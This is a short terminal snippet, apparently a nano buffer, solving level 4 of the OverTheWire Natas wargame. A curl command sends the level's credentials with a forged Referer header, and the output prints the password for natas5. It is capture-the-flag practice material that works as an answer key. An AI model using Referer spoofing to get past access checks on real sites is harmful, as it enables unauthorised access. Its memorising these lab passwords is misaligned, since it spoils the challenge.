@@ -1,0 +1,8 @@
+  GNU nano 8.7.1                      New Buffer *
+curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ \
+  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
+  http://natas4.natas.labs.overthewire.org/
+
+
+
+Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
